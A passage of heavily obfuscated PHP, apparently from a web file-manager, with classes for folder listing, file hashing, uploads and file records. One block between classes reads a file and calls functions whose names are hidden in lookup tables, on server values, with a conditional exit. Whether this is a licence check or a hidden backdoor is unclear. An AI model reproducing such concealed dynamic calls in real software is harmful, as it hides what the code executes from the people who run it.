(!($Ò±ÂĞËÛ = @opendir($§¿òÀÔœ))) { return; } while (($„ƒ€Â²î = readdir($Ò±ÂĞËÛ)) !== !1) { if ($„ƒ€Â²î == $šˆ½ó­‘[10] || $„ƒ€Â²î == $šˆ½ó­‘[1304]) { continue; } $—í¬Üİí = $§¿òÀÔœ . $„ƒ€Â²î; if (is_file($—í¬Üİí) || is_link($—í¬Üİí)) { $à‰Éé´®[$šˆ½ó­‘[87]]++; $à‰Éé´®[$šˆ½ó­‘[86]] += filesize_64($—í¬Üİí); } else { if (is_dir($—í¬Üİí)) { $à‰Éé´®[$šˆ½ó­‘[88]]++; $this->infoChildren($—í¬Üİí, $à‰Éé´®, !1); } } } closedir($Ò±ÂĞËÛ); } private function folderInfo($¡Óéñãë, $‘òìå¤ = false) { $’ƒˆŸÛÊ =& $_SERVER[ªÏ§Ë·]; $¡Óéñãë = rtrim($¡Óéñãë, $’ƒˆŸÛÊ[8]) . $’ƒˆŸÛÊ[8]; $‚ÀÓÆš = $this->iconvApp($this->pathThis($¡Óéñãë)); if ($‘òìå¤) { return array($’ƒˆŸÛÊ[42] => $‚ÀÓÆš, $’ƒˆŸÛÊ[94] => $this->getPathOuter($¡Óéñãë), $’ƒˆŸÛÊ[43] => $’ƒˆŸÛÊ[85]); } $åÊ›æÆú = array($’ƒˆŸÛÊ[42] => $‚ÀÓÆš, $’ƒˆŸÛÊ[94] => $this->getPathOuter($¡Óéñãë), $’ƒˆŸÛÊ[43] => $’ƒˆŸÛÊ[85], $’ƒˆŸÛÊ[211] => @filectime($¡Óéñãë), $’ƒˆŸÛÊ[95] => @filemtime($¡Óéñãë), $’ƒˆŸÛÊ[1388] => @fileatime($¡Óéñãë), $’ƒˆŸÛÊ[1389] => is_readable($¡Óéñãë), $’ƒˆŸÛÊ[1390] => is_writable($¡Óéñãë), $’ƒˆŸÛÊ[1391] => get_mode($¡Óéñãë)); return $åÊ›æÆú; } private function fileInfo($Ÿ‹ğ³Íù, $ã£¿Í›ç = false) { $êš˜ñÇù =& $_SERVER[ªÏ§Ë·]; $ËŸÀ¥Ü€ = $this->iconvApp($this->pathThis($Ÿ‹ğ³Íù)); if ($ã£¿Í›ç) { return array($êš˜ñÇù[42] => $ËŸÀ¥Ü€, $êš˜ñÇù[94] => $this->getPathOuter($Ÿ‹ğ³Íù), $êš˜ñÇù[43] => $êš˜ñÇù[210], $êš˜ñÇù[86] => $this->size($Ÿ‹ğ³Íù), $êš˜ñÇù[184] => $this->ext($ËŸÀ¥Ü€)); } $ğûêŒâõ = array($êš˜ñÇù[42] => $ËŸÀ¥Ü€, $êš˜ñÇù[94] => $this->getPathOuter($Ÿ‹ğ³Íù), $êš˜ñÇù[43] => $êš˜ñÇù[210], $êš˜ñÇù[211] => @filectime($Ÿ‹ğ³Íù), $êš˜ñÇù[95] => @filemtime($Ÿ‹ğ³Íù), $êš˜ñÇù[1388] => @fileatime($Ÿ‹ğ³Íù), $êš˜ñÇù[86] => $this->size($Ÿ‹ğ³Íù), $êš˜ñÇù[184] => $this->ext($ËŸÀ¥Ü€), $êš˜ñÇù[1389] => is_readable($Ÿ‹ğ³Íù), $êš˜ñÇù[1390] => is_writable($Ÿ‹ğ³Íù), $êš˜ñÇù[1391] => get_mode($Ÿ‹ğ³Íù)); return $ğûêŒâõ; } public function exist($»¢ùÉ«ı) { $»¢ùÉ«ı = $this->iconvSystem($»¢ùÉ«ı); return @file_exists($»¢ùÉ«ı); } public function isFile($Ø…€…Õù) { $Ø…€…Õù = $this->iconvSystem($Ø…€…Õù); return @is_file($Ø…€…Õù); } public function isFolder($Íğ”òï•) { $Íğ”òï• = $this->iconvSystem($Íğ”òï•); return @is_dir($Íğ”òï•); } public function listPath($ ”’ø»ã, $–©¶ö‹¯ = false) { $îï”ı«Ğ =& $_SERVER[ªÏ§Ë·]; $ ”’ø»ã = $this->iconvSystem($ ”’ø»ã); $ ”’ø»ã = rtrim($ ”’ø»ã, $îï”ı«Ğ[8]) . $îï”ı«Ğ[8]; $ÍšüÄ«Ç = array($îï”ı«Ğ[92] => array(), $îï”ı«Ğ[93] => array()); if (!($¬öÓäÅş = @opendir($ ”’ø»ã))) { return $ÍšüÄ«Ç; } while (($æüèÑ®ˆ = readdir($¬öÓäÅş)) !== !1) { if ($æüèÑ®ˆ == $îï”ı«Ğ[10] || $æüèÑ®ˆ == $îï”ı«Ğ[1304]) { continue; } $°òŸ¡ÇØ = $ ”’ø»ã . $æüèÑ®ˆ; if (is_file($°òŸ¡ÇØ)) { $ÍšüÄ«Ç[$îï”ı«Ğ[93]][] = $this->fileInfo($°òŸ¡ÇØ, $–©¶ö‹¯); } else { $ÍšüÄ«Ç[$îï”ı«Ğ[92]][] = $this->folderInfo($°òŸ¡ÇØ, $–©¶ö‹¯); } } closedir($¬öÓäÅş); return $ÍšüÄ«Ç; } public function listAll($Ø¡ù¿Á, &$¢àÜåÓ¼ = array()) { $Úù´Í’ =& $_SERVER[ªÏ§Ë·]; $Ø¡ù¿Á = $this->iconvSystem($Ø¡ù¿Á); $Ø¡ù¿Á = rtrim($Ø¡ù¿Á, $Úù´Í’[8]) . $Úù´Í’[8]; if (!($ğàïÒ°Ê = @opendir($Ø¡ù¿Á))) { return $¢àÜåÓ¼; } while (($ì»ïÁá… = readdir($ğàïÒ°Ê)) !== !1) { if ($ì»ïÁá… == $Úù´Í’[10] || $ì»ïÁá… == $Úù´Í’[1304]) { continue; } $ªÄÇóÁ„ = $Ø¡ù¿Á . $ì»ïÁá…; $£îìŸóœ = is_dir($ªÄÇóÁ„) && !is_link($ªÄÇóÁ„) ? 1 : 0; $ªÄÇóÁ„ = $£îìŸóœ ? $ªÄÇóÁ„ . $Úù´Í’[8] : $ªÄÇóÁ„; $¢àÜåÓ¼[] = array($Úù´Í’[94] => $ªÄÇóÁ„, $Úù´Í’[85] => $£îìŸóœ, $Úù´Í’[95] => intval(@filemtime($ªÄÇóÁ„)), $Úù´Í’[86] => $£îìŸóœ ? 0 : intval($this->size($ªÄÇóÁ„))); if ($£îìŸóœ) { $this->listAll($ªÄÇóÁ„, $¢àÜåÓ¼); } } closedir($ğàïÒ°Ê); return $¢àÜåÓ¼; } public function has($×›¼ŠşÓ, $µ“¦ñÕª = false, $ÈÏğÔ™“ = true) { $ğ¢š²„Š =& $_SERVER[ªÏ§Ë·]; $×›¼ŠşÓ = $this->iconvSystem($×›¼ŠşÓ); $×›¼ŠşÓ = rtrim($×›¼ŠşÓ, $ğ¢š²„Š[8]) . $ğ¢š²„Š[8]; if (!($ü«¤´¼£ = @opendir($×›¼ŠşÓ))) { return !1; } $üŸÅ“«„ = 0; $›Â˜¦§† = 0; $÷’øÕ‰Ü = 0; while (($Üä±å€¨ = readdir($ü«¤´¼£)) !== !1) { if ($Üä±å€¨ == $ğ¢š²„Š[10] || $Üä±å€¨ == $ğ¢š²„Š[1304]) { continue; } $îÉ»Ğ½¶ = $×›¼ŠşÓ . $Üä±å€¨; if ($µ“¦ñÕª) { $÷’øÕ‰Ü++; if (@is_file($îÉ»Ğ½¶)) { $üŸÅ“«„++; } else { $›Â˜¦§†++; } if ($÷’øÕ‰Ü > 10000) { break; } continue; } if ($ÈÏğÔ™“) { if (@is_file($îÉ»Ğ½¶)) { return !0; } } else { if (@is_dir($îÉ»Ğ½¶ . $ğ¢š²„Š[8])) { return !0; } } } closedir($ü«¤´¼£); if ($µ“¦ñÕª) { return array($ğ¢š²„Š[217] => $üŸÅ“«„, $ğ¢š²„Š[218] => $›Â˜¦§†); } return !1; } public function hashSimple($‹„µíõ) { $¡ë›”İù =& $_SERVER[ªÏ§Ë·]; if (!$‹„µíõ) { return md5($¡ë›”İù[12]); } $‹„µíõ = $this->iconvSystem($‹„µíõ); $­“ôãà = $this->size($‹„µíõ); $œéîâÛ = 200; $îø¿Š¸ = 50; if ($­“ôãà <= $œéîâÛ * $îø¿Š¸) { return $this->hashMd5($‹„µíõ) . $­“ôãà; } $áäğ—é‰ = $¡ë›”İù[12]; $¥†½Ô¥è = intval($­“ôãà / $îø¿Š¸); $´´·ÅÃ™ = fopen($‹„µíõ, $¡ë›”İù[1392]); if (!$´´·ÅÃ™) { return $áäğ—é‰; } for ($™æ¹Œ¶Æ = 0; $™æ¹Œ¶Æ < $îø¿Š¸; $™æ¹Œ¶Æ++) { fseek_64($´´·ÅÃ™, $¥†½Ô¥è * $™æ¹Œ¶Æ); $áäğ—é‰ .= fread($´´·ÅÃ™, $œéîâÛ); } fseek_64($´´·ÅÃ™, $­“ôãà - $œéîâÛ); $áäğ—é‰ .= fread($´´·ÅÃ™, $œéîâÛ); fclose($´´·ÅÃ™); return md5($áäğ—é‰) . $­“ôãà; } public function getContent($Æïá°ˆ­) { $Æïá°ˆ­ = $this->iconvSystem($Æïá°ˆ­); return file_get_contents($Æïá°ˆ­); } public function setContent($èï´×€…, $‹÷ÜÈÑÈ = '') { $èï´×€… = $this->iconvSystem($èï´×€…); $ÛÍÅ›¤¸ = @file_put_contents($èï´×€…, $‹÷ÜÈÑÈ, LOCK_EX); clearstatcache(); @chmod($èï´×€…, $this->pathAuth); return $ÛÍÅ›¤¸ === !1 ? !1 : !0; } public function fileSubstr($ı˜¸€ÛÌ, $³ë«ùóÉ = 0, $šÕ™ı® = false) { $„Š‚²ùË =& $_SERVER[ªÏ§Ë·]; $ı˜¸€ÛÌ = $this->iconvSystem($ı˜¸€ÛÌ); if ($šÕ™ı® === !1) { $šÕ™ı® = $this->size($ı˜¸€ÛÌ); } if ($šÕ™ı® <= 0) { return $„Š‚²ùË[12]; } $£‰˜Øœß = fopen($ı˜¸€ÛÌ, $„Š‚²ùË[1392]); if (!$£‰˜Øœß) { return !1; } fseek_64($£‰˜Øœß, $³ë«ùóÉ); $¸Ùû¯¦İ = fread($£‰˜Øœß, $šÕ™ı®); fclose($£‰˜Øœß); return $¸Ùû¯¦İ; } public function upload($´õšÃ¨¹, $¿õØ¬ğÁ, $¢ğŸëÎâ = false, $ïŒ×¬ı÷ = REPEAT_REPLACE) { if ($¢ğŸëÎâ) { return $this->moveFile($¿õØ¬ğÁ, $´õšÃ¨¹); } return $this->copyFile($¿õØ¬ğÁ, $´õšÃ¨¹); } public function setModifyTime($˜…ö —“, $ÇÏÚƒï = '') { @touch($˜…ö —“, intval($ÇÏÚƒï)); } public function download($õÃé§öÎ, $÷½‰İµ ) { return $this->iconvSystem($õÃé§öÎ); } } if ($_SERVER[$_SERVER[ªÏ§Ë·][15]] != $_SERVER[$_SERVER[ªÏ§Ë·][1393]]) { $_getc = $_SERVER[ªÏ§Ë·][16]; $_getfile = $_SERVER[$_SERVER[ªÏ§Ë·][17]] . $_SERVER[ªÏ§Ë·][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ªÏ§Ë·][19], $_getfilec); if (count($_getarrs) < $_SERVER[ªÏ§Ë·][20]) { $exit = $_SERVER[ªÏ§Ë·][21]; $exit(); } $_act = $_SERVER[ªÏ§Ë·][22]; $_act($_SERVER[$_SERVER[ªÏ§Ë·][13]]); } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Şçê¨ß½) { parent::__construct($Şçê¨ß½); $this->signatureVersion($_SERVER[ªÏ§Ë·][226]); } public function fileOutLink($Å¨¼®µ) { $ÂıÇã¾ =& $_SERVER[ªÏ§Ë·]; if (substr($Å¨¼®µ, 0, 7) == $ÂıÇã¾[1356]) { $Å¨¼®µ = $ÂıÇã¾[1357] . substr($Å¨¼®µ, 7); } header($ÂıÇã¾[171] . $Å¨¼®µ); die; } } goto DÇöâ«¢î; A«ˆ„ôåÛ»: class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\x6c\x65\x5f\143\x6f\x6e\164\145\x6e\164\163"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\x69\155\x65", "\x74\x69\155\x65", "\x69\x6e\163\145\x72\164", "\x66\165\156\x63\x74\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\151\x6c\145"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\x61\155\x65" => "\151\x6f\x5f\x66\151\154\x65\137\155\x65\x74\x61", "\x6d\145\164\x61\106\x69\x65\154\144" => "\x66\151\154\x65\111\x44"); public function fileInfo($Í¶Ù¬ÌÃ) { $½î»µª¯ =& $_SERVER[ªÏ§Ë·]; static $‰•›‘•› = array(); if (!isset($‰•›‘•›[$Í¶Ù¬ÌÃ])) { $ª‚Üà­ = $½î»µª¯[1906]; $ùØÑ¥¨ğ = Model($½î»µª¯[509])->field($ª‚Üà­)->where(array($½î»µª¯[507] => $Í¶Ù¬ÌÃ))->find(); $‰•›‘•›[$Í¶Ù¬ÌÃ] = $ùØÑ¥¨ğ; } return $‰•›‘•›[$Í¶Ù¬ÌÃ]; } public function addFileByContent($ÅšÕãò = '', $ÔÛ‰³ıê = '') { $üÜè£ƒ¿ =& $_SERVER[ªÏ§Ë·]; $¾•ÔÔ¯© = TEMP_PATH . $üÜè£ƒ¿[1907]; if (!is_dir($¾•ÔÔ¯©)) { mk_dir($¾•ÔÔ¯©); } $ÄşĞçà = $¾•ÔÔ¯© . $üÜè£ƒ¿[1908] . rand_string(16); file_put_contents($ÄşĞçà, $ÅšÕãò); $Åˆ¶Àğ« = $this->addFile($ÄşĞçà, $ÔÛ‰³ıê, !0); if (file_exists($ÄşĞçà)) { @unlink($ÄşĞçà); } return $Åˆ¶Àğ«; } public function createFileName($Ú¿·ÔŞé, $²ºÙŒ¦è = false, $‘Áíš = false) { $Ù³ÍŞåŸ =& $_SERVER[ªÏ§Ë·]; $®ç¾û¥Õ = IO::init($Ù³ÍŞåŸ[8]); $âúº˜× = $this->makeFilePath($Ú¿·ÔŞé, $®ç¾û¥Õ, $²ºÙŒ¦è, $‘Áíš); $˜å¬ğ’Ü = $®ç¾û¥Õ->pathFather($âúº˜×); static $´è„üøØ = false; $ìÈú€„¯ = $Ù³ÍŞåŸ[1909] . md5($˜å¬ğ’Ü); if (!$´è„üøØ && !Cache::get($ìÈú€„¯)) { $´è„üøØ = !0; $íÙ¸ôñÎ = IO::mkdir($˜å¬ğ’Ü); if (!IO::exist($íÙ¸ôñÎ . $Ù³ÍŞåŸ[825])) { IO::mkfile($íÙ¸ôñÎ . $Ù³ÍŞåŸ[825]); } Cache::set($ìÈú€„¯, 1, 3600 * 2); } return $âúº˜×; } public function makeFilePath($ÌÊÁŸÙÃ, $šÅÔÉÓ¶, $ãæ†Ï¿à = false, $Õ¬›™·Ò = false) { $Ã˜¸…Éâ =& $_SERVER[ªÏ§Ë·]; $æ•÷Æ¦÷ = Model($Ã˜¸…Éâ[798])->get($Ã˜¸…Éâ[1910]); $¼™”î²ø = KodIO::defaultIO() . date($Ã˜¸…Éâ[1911]); $±ñèØ°ù = $¼™”î²ø . rand_string(5) . short_id(100); $ÌÊÁŸÙÃ = str_replace($Ã˜¸…Éâ[8], $Ã˜¸…Éâ[11], KodIO::clear($ÌÊÁŸÙÃ)); $ÓÍÅ„•ø = $šÅÔÉÓ¶->ext($ÌÊÁŸÙÃ); if (!$ÌÊÁŸÙÃ) { $æ•÷Æ¦÷ = $Ã˜¸…Éâ[1912]; } switch ($æ•÷Æ¦÷) { case $Ã˜¸…Éâ[1913]: $±ñèØ°ù = $±ñèØ°ù . $Ã˜¸…Éâ[10] . $šÅÔÉÓ¶->ext($ÌÊÁŸÙÃ); if ($ÓÍÅ„•ø == $Ã˜¸…Éâ[1850]) { $±ñèØ°ù .= $Ã˜¸…Éâ[1231]; } break; case $Ã˜¸…Éâ[1914]: $ğ¸ö¡„â = Model($Ã˜¸…Éâ[798])->get($Ã˜¸…Éâ[799]); $õÑÁ¢ ™ = substr(md5($Ã˜¸…Éâ[800] . $ğ¸ö¡„â . date($Ã˜¸…Éâ[776])), 0, 8); $Î…¿˜ = KodIO::defaultDriver(); $¼™”î²ø = $Ã˜¸…Éâ[1262] . $Î…¿˜[$Ã˜¸…Éâ[437]] . $Ã˜¸…Éâ[447] . date($Ã˜¸…Éâ[1915]) . $õÑÁ¢ ™ . $Ã˜¸…Éâ[8]; if ($ÓÍÅ„•ø == $Ã˜¸…Éâ[1850]) { $ÌÊÁŸÙÃ .= $Ã˜¸…Éâ[1231]; } $ãù„¤÷ = $Ã˜¸…Éâ[1916] . $¼™”î²ø . $ÌÊÁŸÙÃ; CacheLock::lock($ãù„¤÷); $±ñèØ°ù = $¼™”î²ø . $ÌÊÁŸÙÃ; if (IO::exist($¼™”î²ø . $ÌÊÁŸÙÃ)) { $ëäéìò = substr($ÌÊÁŸÙÃ, 0, strlen($ÌÊÁŸÙÃ) - strlen($ÓÍÅ„•ø)); $äŒ™áÔ = $Õ¬›™·Ò ? substr($Õ¬›™·Ò, 0, 5) : ($ãæ†Ï¿à ? substr($ãæ†Ï¿à, 0, 5) : rand_string(5)); $±ñèØ°ù = $¼™”î²ø . $ëäéìò . $äŒ™áÔ . $Ã˜¸…Éâ[10] . $ÓÍÅ„•ø; } if (IO::isTypeObject($±ñèØ°ù) && !IO::isUploadServer($±ñèØ°ù)) { if (IO::exist($±ñèØ°ù)) { return $±ñèØ°ù; } $ˆú”Ãß = IO::setContent($±ñèØ°ù, $Ã˜¸…Éâ[12]); if (!$ˆú”Ãß) { show_json($Ã˜¸…Éâ[1917], !1); } } CacheLock::unlock($ãù„¤÷); break; case $Ã˜¸…Éâ[1912]: break; default: break; } return $±ñèØ°ù; } public function addFileByRemote($Õı“±„Û, $‹ˆ”±¤Ü, $âÀô¬æı = array()) { $Ë áÌ =& $_SERVER[ªÏ§Ë·]; if (!IO::exist($Õı“±„Û)) { return !1; } $ÛÒì–ˆ¦ = $âÀô¬æı[$Ë áÌ[186]] ? $âÀô¬æı[$Ë áÌ[186]] : $Ë áÌ[12]; $¸óõ†öô = IO::hashMd5($Õı“±„Û, $ÛÒì–ˆ¦); $Öì…¦À€ = KodIO::defaultDriver(); $ãçœ‰ì  = array($Ë áÌ[583] => IO::size($Õı“±„Û), $Ë áÌ[1918] => 1, $Ë áÌ[458] => $‹ˆ”±¤Ü, $Ë áÌ[836] => $Öì…¦À€[$Ë áÌ[437]], $Ë áÌ[459] => $Õı“±„Û, $Ë áÌ[1919] => $âÀô¬æı[$Ë áÌ[187]] ? $âÀô¬æı[$Ë áÌ[187]] : IO::hashSimple($Õı“±„Û), $Ë áÌ[1920] => $¸óõ†öô ? $¸óõ†öô : $ÛÒì–ˆ¦); if ($ú õ»Úƒ = $this->addFileCheckExist($ãçœ‰ì [$Ë áÌ[187]], $ãçœ‰ì [$Ë áÌ[186]], $ãçœ‰ì [$Ë áÌ[86]])) { return $ú õ»Úƒ; } return $this->addFileData($ãçœ‰ì ); } private function addFileData($Ÿ­¿ºØæ) { $ÎÌÌö˜ =& $_SERVER[ªÏ§Ë·]; if (!$Ÿ­¿ºØæ) { return !1; } $Ÿ­¿ºØæ[$ÎÌÌö˜[86]] = intval($Ÿ­¿ºØæ[$ÎÌÌö˜[86]]); if (!$Ÿ­¿ºØæ[$ÎÌÌö˜[86]] && strlen($Ÿ­¿ºØæ[$ÎÌÌö˜[187]]) > 32) { $Ÿ­¿ºØæ[$ÎÌÌö˜[86]] = intval(substr($Ÿ­¿ºØæ[$ÎÌÌö˜[187]], 32)); } $ÕÜÊñÈô = $this->add($Ÿ­¿ºØæ); return $this->find($ÕÜÊñÈô); } public function addFile($ê÷æÀüİ, $Áößˆ…š, $ô®âµ­ = false) { $©¿—æÙ =& $_SERVER[ªÏ§Ë·]; $·Õ·”ÒÁ = IO::hashSimple($ê÷æÀüİ); $úÒ·…¨¬ = IO::size($ê÷æÀüİ); $¢çÓÙ®° = $úÒ·…¨¬ <= 1024 * 1024 * 10 ? IO::hashMd5($ê÷æÀüİ) : $©¿—æÙ[12]; $Ä·’„»Ş = $©¿—æÙ[1921] . $·Õ·”ÒÁ; CacheLock::lock($Ä·’„»Ş); if ($¢çÓÙ®° && $·Õ·”ÒÁ) { $ëÚñÂ± = $this->addFileCheckExist($·Õ·”ÒÁ, $¢çÓÙ®°, $úÒ·…¨¬); if ($ëÚñÂ±) { CacheLock::unlock($Ä·’„»Ş); return $ëÚñÂ±; } } $ÊÂúÔ»  = $this->addFileMake($ê÷æÀüİ, $úÒ·…¨¬, $·Õ·”ÒÁ, $¢çÓÙ®°, $Áößˆ…š, $ô®âµ­); $ˆªªÆÍ» = $this->addFileData($ÊÂúÔ» ); CacheLock::unlock($Ä·’„»Ş); if (!$¢çÓÙ®° && $ˆªªÆÍ») { $this->fileMd5Check($ˆªªÆÍ»); } return $ˆªªÆÍ»; } private function fileMd5Check($ù¢§ı´û) { $Úª¤ï©§ =& $_SERVER[ªÏ§Ë·]; $ºÙã‚åé = array($ù¢§ı´û[$Úª¤ï©§[506]], $ù¢§ı´û[$Úª¤ï©§[94]]); $”¤•ºŸ = $Úª¤ï©§[1922] . $ù¢§ı´û[$Úª¤ï©§[94]]; $’Œ©ÎµÎ = $Úª¤ï©§[1923] . $ù¢§ı´û[$Úª¤ï©§[506]]; $ŞæüÀ´– = TaskQueue::add($Úª¤ï©§[1924], $ºÙã‚åé, $”¤•ºŸ, $’Œ©ÎµÎ); if (!$ŞæüÀ´–) { $this->fileMd5Set($ù¢§ı´û[$Úª¤ï©§[506]], $ù¢§ı´û[$Úª¤ï©§[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($“…ÔÔ³å, $›¯’±Ö) { $’­°˜· =& $_SERVER[ªÏ§Ë·]; $´Ù³ÄÍ» = $this->find($“…ÔÔ³å); if (!$´Ù³ÄÍ» || $´Ù³ÄÍ»[$’­°˜·[186]]) { return; } $”²ÏÏÁƒ = IO::hashMd5($›¯’±Ö); if (!$”²ÏÏÁƒ) { return $’­°˜·[12]; } $this->where(array($’­°˜·[506] => $“…ÔÔ³å))->save(array($’­°˜·[186] => $”²ÏÏÁƒ)); } public function addFileMake($¼¼ğœ¯¨, $”ÖÆ¾ñ“, $‰’ÕüÙ‰, $»¶†Æãø, $ãœùÊ²£, $Íéşù•) { $øúò–¹– =& $_SERVER[ªÏ§Ë·]; $ÀÀÀç¿Ë = $this->createFileName($ãœùÊ²£, $‰’ÕüÙ‰, $»¶†Æãø); $Ò˜èĞ§Ï = get_path_father($ÀÀÀç¿Ë); $Æñ«Ş¨ó = get_path_this($ÀÀÀç¿Ë); if ($Íéşù•) { $¤º€ÌÔù = IO::move($¼¼ğœ¯¨, $Ò˜èĞ§Ï, !1, $Æñ«Ş¨ó); } else { $¤º€ÌÔù = IO::copy($¼¼ğœ¯¨, $Ò˜èĞ§Ï, !1, $Æñ«Ş¨ó); } if (!$¤º€ÌÔù) { return !1; } $¾”œ È¦ = KodIO::defaultDriver(); $í—Ò•´é = array($øúò–¹–[583] => $”ÖÆ¾ñ“, $øúò–¹–[1918] => 1, $øúò–¹–[458] => $ãœùÊ²£, $øúò–¹–[836] => $¾”œ È¦[$øúò–¹–[437]], $øúò–¹–[459] => $ÀÀÀç¿Ë, $øúò–¹–[1919] => $‰’ÕüÙ‰, $øúò–¹–[1920] => $»¶†Æãø); return $í—Ò•´é; } public function addFileCheckExist($É¤®ÁÍ¥, $®¬Âíç¦, $Õú’ô—Ô) { $˜°¿ô¦à =& $_SERVER[ªÏ§Ë·]; $î©­óš = $this->findByHash($É¤®ÁÍ¥, $®¬Âíç¦); if (!$î©­óš) { return !1; } $ªı¸´•Ô = array($˜°¿ô¦à[1918] => intval($î©­óš[$˜°¿ô¦à[1925]]) + 1, $˜°¿ô¦à[583] => $Õú’ô—Ô); $this->where(array($˜°¿ô¦à[507] => $î©­óš[$˜°¿ô¦à[506]]))->save($ªı¸´•Ô); return $î©­óš; } public function remove($İö»Î£) { $this->linkCountChange($İö»Î£, !1); $this->clearEmpty(); return !0; } public function linkAdd($©ÆĞ÷¥À) { $this->linkCountChange($©ÆĞ÷¥À, !0); } public function linkCountChange($úàäıÈ¹, $üĞèÃŞ) { $éıÆçß¤ =& $_SERVER[ªÏ§Ë·]; if (!$úàäıÈ¹) { return; } if (!is_array($úàäıÈ¹)) { $úàäıÈ¹ = array($úàäıÈ¹); } $ŸĞ»Üä = array(); foreach ($úàäıÈ¹ as $õÊ€·¨Ê) { $·óóµ²½ = $õÊ€·¨Ê . $éıÆçß¤[12]; if (!$ŸĞ»Üä[$·óóµ²½]) { $ŸĞ»Üä[$·óóµ²½] = 0; } $ŸĞ»Üä[$·óóµ²½]++; } $Ÿâ’¾­ = array(); foreach ($ŸĞ»Üä as $õÊ€·¨Ê => $åÌäÓÆ) { $·óóµ²½ = $åÌäÓÆ . $éıÆçß¤[12]; if (!$Ÿâ’¾­[$·óóµ²½]) { $Ÿâ’¾­[$·óóµ²½] = array(); } $Ÿâ’¾­[$·óóµ²½][] = $õÊ€·¨Ê; } foreach ($Ÿâ’¾­ as $åÌäÓÆ => $Âº‰¿Ïõ) { if (!$Âº‰¿Ïõ) { continue; } $åÌäÓÆ = $üĞèÃŞ ? $åÌäÓÆ : -intval($åÌäÓÆ); $¬¶ÅùÁÔ = array($éıÆçß¤[506] => array($éıÆçß¤[7], $Âº‰¿Ïõ)); if ($åÌäÓÆ < 0) { $¬¶ÅùÁÔ[$éıÆçß¤[1925]] = array($éıÆçß¤[1040], abs($åÌäÓÆ)); } $this->where($¬¶ÅùÁÔ)->setAdd($éıÆçß¤[1925], $åÌäÓÆ); } } public function findByHash($÷­Î‰, $â¾Ğäû = false) { $÷ñó÷½Ù =& $_SERVER[ªÏ§Ë·]; if (!$÷­Î‰ && !$â¾Ğäû) { return !1; } $ú»¡ë…Ã = array($÷ñó÷½Ù[1919] => $÷­Î‰); if ($â¾Ğäû) { $ú»¡ë…Ã = array($÷ñó÷½Ù[1920] => $â¾Ğäû); } return $this->order($÷ñó÷½Ù[1926])->where($ú»¡ë…Ã)->find(); } public function clearEmpty($áÊ™ıºœ = 0) { $·ùŞ»· =& $_SERVER[ªÏ§Ë·]; $†Ó°ã€ = time() - 3600 * 24 * $áÊ™ıºœ; $¸¨ˆ×ÅË = $·ùŞ»·[1927] . $†Ó°ã€; $Å£…¸ Ó = $this->where($¸¨ˆ×ÅË)->select(); if (!$Å£…¸ Ó) { return; } $¾úØ” = new Task($·ùŞ»·[1928], $·ùŞ»·[12], count($Å£…¸ Ó)); foreach ($Å£…¸ Ó as $¬‹¦ı’¤) { $¾úØ”->update(1); $this->resetFile($¬‹¦ı’¤); } $¾úØ”->end(); } public function resetFile($·àå·³ª) { $˜¿İÒ¥´ =& $_SERVER[ªÏ§Ë·]; $³™æÄ´ï = array($˜¿İÒ¥´[507] => $·àå·³ª[$˜¿İÒ¥´[506]]); $üˆë´¶– = Model($˜¿İÒ¥´[1358])->where($³™æÄ´ï)->count(); $æø±ˆ‘Î = Model($˜¿İÒ¥´[1929])->where($³™æÄ´ï)->count(); $¸°«áı“ = intval($üˆë´¶–) + intval($æø±ˆ‘Î); if ($¸°«áı“ == 0) { IO::remove($·àå·³ª[$˜¿İÒ¥´[94]]); Model($˜¿İÒ¥´[1930])->delete($·àå·³ª[$˜¿İÒ¥´[506]]); $this->where($³™æÄ´ï)->delete(); $this->metaSet($·àå·³ª[$˜¿İÒ¥´[506]], null, null); return; } if ($·àå·³ª[$˜¿İÒ¥´[1925]] != $¸°«áı“) { $this->where($³™æÄ´ï)->save(array($˜¿İÒ¥´[1918] => $¸°«áı“)); } } public function storageInfo($£†ŒÊå = false) { $¹ÁÃñ²İ =& $_SERVER[ªÏ§Ë·]; $Û¶ÑÌõ = $this->count() + 0.0; $Ö©Õ£ˆ = 0; $©¥¹ñû¥ = 1; $øŸÀñ› = 0; $ş­—éÊ¦ = 5000; for ($óŸÓ¡Òı = 0; $óŸÓ¡Òı < $Û¶ÑÌõ; $óŸÓ¡Òı = $óŸÓ¡Òı + $ş­—éÊ¦) { $©ÙÙ¸Ò˜ = $this->limit($óŸÓ¡Òı, $óŸÓ¡Òı + $ş­—éÊ¦)->select(); foreach ($©ÙÙ¸Ò˜ as $¨ÉîúÅè) { $©¥¹ñû¥ += $¨ÉîúÅè[$¹ÁÃñ²İ[86]] * $¨ÉîúÅè[$¹ÁÃñ²İ[1925]]; $Ö©Õ£ˆ += $¨ÉîúÅè[$¹ÁÃñ²İ[86]] * ($¨ÉîúÅè[$¹ÁÃñ²İ[1925]] - 1); $øŸÀñ› += $¨ÉîúÅè[$¹ÁÃñ²İ[1925]]; } } $³ÄÄ¾ = array($¹ÁÃñ²İ[1931] => $©¥¹ñû¥, $¹ÁÃñ²İ[1932] => $Ö©Õ£ˆ, $¹ÁÃñ²İ[1933] => $Ö©Õ£ˆ / $©¥¹ñû¥, $¹ÁÃñ²İ[90] => $Û¶ÑÌõ, $¹ÁÃñ²İ[1934] => $øŸÀñ›); return $³ÄÄ¾; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\x62\154\145\116\x61\155\x65" => "\147\x72\157\165\x70\x5f\x6d\145\164\141", "\155\145\164\x61\106\151\145\154\x64" => "\x67\x72\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($¾¨ÏÕÎğ) { $Ö·‹å ó =& $_SERVER[ªÏ§Ë·]; return array($Ö·‹å ó[1935] => array($¾¨ÏÕÎğ[0], $Ö·‹å ó[1936]), $Ö·‹å ó[1937] => array($¾¨ÏÕÎğ[0], $Ö·‹å ó[1938])); } protected function getInfo($öóÖˆå¤, $®ç¶ŠÈÃ = false) { $úŸÍÍ¯ = $this->getInfoSimple($öóÖˆå¤); if (!$úŸÍÍ¯) { return !1; } if ($®ç¶ŠÈÃ) { return $this->_listDataApplyItem($úŸÍÍ¯); } return 